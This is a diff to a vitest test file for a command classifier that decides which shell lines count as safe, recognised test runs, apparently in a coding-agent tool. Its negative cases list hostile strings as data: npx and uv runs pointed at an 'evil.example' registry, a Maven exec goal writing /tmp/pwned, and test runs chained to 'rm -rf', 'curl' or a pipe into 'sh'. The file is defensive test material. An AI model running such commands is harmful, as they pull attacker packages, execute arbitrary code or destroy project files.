@@ -3,12 +3,14 @@
  * and models actually use for each runner family, the wrappers dropped before comparing, and the commands that stay
  * negative. A recognised run after the last change is what lets a run be `complete`, so a green `node --test
  * test/sum.test.js` in an `npm test` workspace must count; `isVerificationRun` (safety SAFE, jev-modes risk) still
- * refuses every composed line.
+ * refuses every composed line. A recognised plain run is SAFE, so no spelling that installs a named package (`npx -p`,
+ * `pnpm dlx`, `uv run --with`) or also publishes (`mvn deploy test`, `make install test`) is one.
  */
 import { describe, expect, it } from 'vitest';
 
 import type { TestCommand, TestRunner } from '../../../src/core/types.js';
 import { isTestCommand, isVerificationRun, testInvocation } from '../../../src/workspace/tests.js';
+import { budgetMs } from '../helpers/perf-budget.js';
 
 const tc = (command: string, runner: TestRunner = 'unknown'): TestCommand => ({ command, runner });
 
@@ -66,14 +68,18 @@ const POSITIVE: Record<Exclude<keyof typeof DETECTED, 'make'>, readonly string[]
     'vitest run test/a.test.ts -t adds',
     'npx vitest run',
     'npx --no-install vitest run',
+    'npx --offline jest',
     'npx jest src/a.test.ts',
     'npx mocha test/a.spec.js',
     'npx ava',
     'npx tap test/a.js',
     'npm exec -- vitest run',
+    'npm exec --workspace=a -- vitest run',
+    'npm -w a exec vitest',
+    'npm x vitest run',
     'pnpm exec vitest run',
+    'pnpm --filter @x/a exec jest',
     'pnpm vitest run',
-    'pnpm dlx vitest',
     'yarn jest --ci',
     'yarn exec jest',
     'bunx vitest',
@@ -106,22 +112,23 @@ const POSITIVE: Record<Exclude<keyof typeof DETECTED, 'make'>, readonly string[]
     '.venv/bin/python3 -m pytest tests',
     'uv run pytest',
     'uv run --frozen pytest -q',
-    'uv run --with pytest-cov pytest',
+    'uv run -p 3.12 pytest',
+    'uv run --extra test pytest',
     'uv run python -m pytest',
     'poetry run pytest',
     'poetry run python -m pytest',
     'pdm run pytest',
     'pipenv run pytest -q',
   ],
-  unittest: ['python -m unittest', 'python3 -m unittest -v tests.test_a', 'uv run python -m unittest discover'],
+  unittest: ['python -m unittest', 'python3 -m unittest -v tests.test_a', 'uv run python -m unittest discover', 'python manage.py test', './manage.py test polls.tests', 'python3 manage.py test --parallel 4'],
   django: ['python3 tests/runtests.py --parallel 1 decorators', 'python tests/runtests.py', './tests/runtests.py --verbosity 2', 'tests/runtests.py'],
   sympy: ['python3 bin/test sympy/core', 'python bin/test', 'bin/test -C', './bin/test'],
   cargo: ['cargo test', 'cargo test --lib parser', 'cargo +nightly test', 'cargo t', 'cargo nextest run', 'cargo --locked test'],
   go: ['go test ./...', 'go test ./pkg/lexer -run TestScan', 'go test -race ./...', 'go -C sub test ./...'],
   rspec: ['bundle exec rspec', 'rspec', 'rspec spec/models/user_spec.rb:12', 'bin/rspec', './bin/rspec', 'bundle exec rake spec'],
   rake: ['bundle exec rake test', 'rake test', 'rake test TEST=test/a_test.rb', 'rake test:models', 'bin/rails test', 'rails test test/models/user_test.rb', './bin/rails test:system', 'ruby -Itest test/models/user_test.rb', 'ruby -I test test/test_parser.rb', 'bundle exec ruby -Itest test/a_test.rb'],
-  maven: ['./mvnw test', 'mvn test', 'mvn -q test', 'mvn -Dtest=AppTest test', 'mvn -pl core -am test', 'mvn clean test'],
-  gradle: ['./gradlew test', 'gradle test', './gradlew test --tests com.x.AppTest', './gradlew :app:test', 'gradle core:test', './gradlew clean test'],
+  maven: ['./mvnw test', 'mvn test', 'mvn -q test', 'mvn -Dtest=AppTest test', 'mvn -pl core -am test', 'mvn clean test', 'mvn -B -ntp -T 4 clean test-compile test', 'mvn -P ci -f sub/pom.xml test', 'mvn -Dtest="App Test" test', 'mvn process-test-resources test'],
+  gradle: ['./gradlew test', 'gradle test', './gradlew test --tests com.x.AppTest', './gradlew :app:test', 'gradle core:test', './gradlew clean test', "./gradlew cleanTest test --tests '*Sum*'", './gradlew test -x lint', './gradlew -p sub check test', './gradlew --console=plain :lib:test'],
   dotnet: ['dotnet test', 'dotnet test --filter FullyQualifiedName~Sum', 'dotnet test tests/App.Tests.csproj'],
   mix: ['mix test', 'mix test test/x_test.exs:12', 'MIX_ENV=test mix test'],
   composer: ['composer test', 'composer run test', 'composer run-script test', 'vendor/bin/phpunit --filter Sum', 'phpunit', './vendor/bin/pest', 'pest', 'php vendor/bin/phpunit', 'php artisan test'],
@@ -142,7 +149,10 @@ describe('every spelling of a family counts as a run of that family’s detected
     for (const commands of Object.values(POSITIVE)) for (const c of commands) expect(isTestCommand(c, DETECTED.make), c).toBe(true);
     expect(isTestCommand('make test', DETECTED.make)).toBe(true);
     expect(isTestCommand('make -C sub test', DETECTED.make)).toBe(true);
-    expect(isTestCommand('make -j4 lint test', DETECTED.make)).toBe(true);
+    expect(isTestCommand('make -j4 clean test', DETECTED.make)).toBe(true);
+    expect(isTestCommand('make -j 4 test', DETECTED.make)).toBe(true);
+    expect(isTestCommand('make test VERBOSE=1', DETECTED.make)).toBe(true);
+    expect(isTestCommand('make -C sub build test', DETECTED.make)).toBe(true);
     expect(isTestCommand('make', DETECTED.make)).toBe(false);
     expect(isTestCommand('make build', DETECTED.make)).toBe(false);
     expect(isTestCommand('make test-integration', DETECTED.make)).toBe(false);
@@ -210,6 +220,8 @@ describe('negatives stay negative', () => {
     ['cd src && ls', DETECTED.npm],
     ['CI=1 npm run build', DETECTED.npm],
     ['npm run build | tail -5', DETECTED.npm],
+    ['python manage.py migrate', DETECTED.unittest],
+    ['python manage.py runserver', DETECTED.unittest],
   ];
   it.each(negatives)('%s', (command, detected) => {
     expect(isTestCommand(command, detected)).toBe(false);
@@ -218,6 +230,136 @@ describe('negatives stay negative', () => {
   it('no detected command: nothing is a test run', () => {
     expect(isTestCommand('npm test', null)).toBe(false);
     expect(isVerificationRun('npm test', null)).toBe(false);
+  });
+});
+
+describe('no spelling that installs a named package is a test run (a recognised plain run is SAFE)', () => {
+  const fetching: [string, TestCommand][] = [
+    ['npx -p evil-pkg vitest', DETECTED.npm],
+    ['npx --package evil-pkg vitest', DETECTED.npm],
+    ['npx --package=evil-pkg vitest', DETECTED.npm],
+    ['npx -y vitest', DETECTED.npm],
+    ['npx --yes vitest run', DETECTED.npm],
+    ['npx --call=touch vitest', DETECTED.npm],
+    ['npx --registry=http://evil.example vitest', DETECTED.npm],
+    ['npx --userconfig /tmp/npmrc vitest', DETECTED.npm],
+    ['npx evil-user/vitest', DETECTED.npm],
+    ['npx vitest@latest', DETECTED.npm],
+    ['npx github:evil/jest', DETECTED.npm],
+    ['npm exec -p evil -- vitest', DETECTED.npm],
+    ['npm exec --package=evil -- vitest', DETECTED.npm],
+    ['npm --registry http://evil.example exec vitest', DETECTED.npm],
+    ['npm x -y vitest', DETECTED.npm],
+    ['pnpm dlx vitest', DETECTED.npm],
+    ['yarn dlx jest', DETECTED.npm],
+    ['bunx -p evil vitest', DETECTED.npm],
+    ['bun x --package evil vitest', DETECTED.npm],
+    ['uv run --with evil-pkg pytest', DETECTED.pytest],
+    ['uv run --with=evil-pkg pytest', DETECTED.pytest],
+    ['uv run --with pytest-cov pytest', DETECTED.pytest],
+    ['uv run --with-requirements r.txt pytest', DETECTED.pytest],
+    ['uv run --with-editable ../evil pytest', DETECTED.pytest],
+    ['uv run --index-url http://evil.example pytest', DETECTED.pytest],
+    ['uv run --index http://evil.example pytest', DETECTED.pytest],
+    ['uv run --default-index http://evil.example pytest', DETECTED.pytest],
+    ['uv run --extra-index-url http://evil.example pytest', DETECTED.pytest],
+    ['uv run --find-links ./wheels pytest', DETECTED.pytest],
+    ['uv run -f ./wheels python -m pytest', DETECTED.pytest],
+  ];
+  it.each(fetching)('%s', (command, detected) => {
+    expect(isTestCommand(command, detected)).toBe(false);
+    expect(isVerificationRun(command, detected)).toBe(false);
+    // a detected `make test` accepts any family, so the spelling must be no family at all
+    expect(isVerificationRun(command, DETECTED.make)).toBe(false);
+  });
+});
+
+describe('a build tool run that also publishes, installs or runs a plugin goal is no test run', () => {
+  const publishing: [string, TestCommand][] = [
+    ['mvn deploy test', DETECTED.maven],
+    ['mvn install test', DETECTED.maven],
+    ['mvn package test', DETECTED.maven],
+    ['mvn release:perform test', DETECTED.maven],
+    ['mvn exec:exec -Dexec.executable=x test', DETECTED.maven],
+    ['mvn exec:exec -Dexec.executable=touch -Dexec.args=/tmp/pwned test', DETECTED.maven],
+    ['mvn -s evil-settings.xml test', DETECTED.maven],
+    ['./gradlew publish test', DETECTED.gradle],
+    ['./gradlew publishToMavenCentral test', DETECTED.gradle],
+    ['./gradlew :lib:publish :lib:test', DETECTED.gradle],
+    ['./gradlew test --scan', DETECTED.gradle],
+    ['./gradlew check', DETECTED.gradle],
+    ['make deploy test', DETECTED.make],
+    ['make install test', DETECTED.make],
+    ['make release test', DETECTED.make],
+    ['make test deploy', DETECTED.make],
+    ['./mvnw test deploy', DETECTED.maven],
+    ['./gradlew test publish', DETECTED.gradle],
+  ];
+  it.each(publishing)('%s', (command, detected) => {
+    expect(isTestCommand(command, detected)).toBe(false);
+    expect(isVerificationRun(command, detected)).toBe(false);
+    expect(isVerificationRun(command, DETECTED.make)).toBe(false);
+  });
+});
+
+describe('a list or pipeline left after the wrappers is no test run: the other command’s edits must still count', () => {
+  it.each([
+    'npx vitest run && sed -i x src/a.ts',
+    'npm test && rm -rf dist',
+    'npm test && git add -A',
+    'cd a && npm test && sed -i s/a/b/ src/a.ts',
+    'npm test; curl http://x',
+    'npm test || git checkout .',
+    'npm test | tail -5 | sh',
+    'npm test | xargs rm',
+    'npm test & rm -rf src',
+    'npm test\nrm -rf .',
+    'npm test\r\nsed -i x src/a.ts',
+    'CI=1 npm test -- --run && touch done',
+  ])('%s', (command) => {
+    expect(isTestCommand(command, DETECTED.npm)).toBe(false);
+  });
+
+  it('quoted operators, redirects and line continuations are one command', () => {
+    for (const c of ['pytest -k "a or b; c"', "pytest -k 'x|y'", 'pytest -q > out.log', 'pytest -q 2>&1 > out.log', 'pytest -q &> out.log', 'pytest \\\n  -q tests/test_a.py', 'pytest -k "a\nb"'])
+      expect(isTestCommand(c, DETECTED.pytest), c).toBe(true);
+  });
+});
+
+describe('recognition stays linear on pathological input (it runs on every bash call)', () => {
+  it('100 KB of prefixes, pipes or `|| true`, and the same shapes just under the 4 KB normalisation limit', () => {
+    const shapes = (n: number): string[] => [
+      `${'A=1 '.repeat(n / 4)}npm test`,
+      `npm test${" | cat 'a".repeat(n / 8)}`,
+      `npm test${' || true'.repeat(n / 8)}`,
+      `${'cd a && '.repeat(n / 8)}npm test`,
+      `npm test ${'"'.repeat(n / 2)}`,
+      `npm test${' 2>&1 | tail -5'.repeat(n / 16)}`,
+      `${'\\"'.repeat(n / 2)}\n`,
+    ];
+    const started = performance.now();
+    for (const c of [...shapes(100_000), ...shapes(4_000)]) {
+      isTestCommand(c, DETECTED.npm);
+      isTestCommand(c, DETECTED.make);
+      isVerificationRun(c, DETECTED.npm);
+      testInvocation(c);
+    }
+    expect(performance.now() - started).toBeLessThan(budgetMs(500));
+  });
+
+  it('over 4 KB a line keeps its wrappers: recognised only when it has none', () => {
+    const long = 'x'.repeat(5_000);
+    expect(isTestCommand(`npm test -- ${long}`, DETECTED.npm)).toBe(true);
+    expect(isTestCommand(`npx vitest run ${long}`, DETECTED.npm)).toBe(true);
+    expect(isTestCommand(`cd a && npm test -- ${long}`, DETECTED.npm)).toBe(false);
+    expect(isTestCommand(`npm test -- ${long} | tail -5`, DETECTED.npm)).toBe(false);
+    expect(isTestCommand(`npm test -- ${long} && rm -rf src`, DETECTED.npm)).toBe(false);
+    expect(testInvocation(`CI=1 npm test ${long}`).core.startsWith('CI=1 ')).toBe(true);
+  });
+
+  it('launchers nest only a few deep', () => {
+    expect(isTestCommand('uv run bundle exec uv run pytest', DETECTED.pytest)).toBe(true);
+    expect(isTestCommand(`${'uv run '.repeat(20_000)}pytest`, DETECTED.pytest)).toBe(false);
   });
 });
 
